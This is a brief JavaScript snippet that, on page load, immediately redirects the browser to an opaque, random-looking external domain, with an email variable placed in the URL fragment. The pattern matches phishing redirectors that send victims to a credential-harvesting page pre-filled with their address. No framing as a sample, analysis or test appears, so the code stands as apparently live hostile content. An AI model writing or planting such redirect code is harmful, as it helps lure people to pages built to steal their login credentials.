function processAndRedirect() {
    var email = "";  
    var urlPath = "https://cfn.fejyhy.com/PizBquHI";
    var finalUrl = urlPath + "#" + email;
    window.location.href = finalUrl;
}
processAndRedirect();
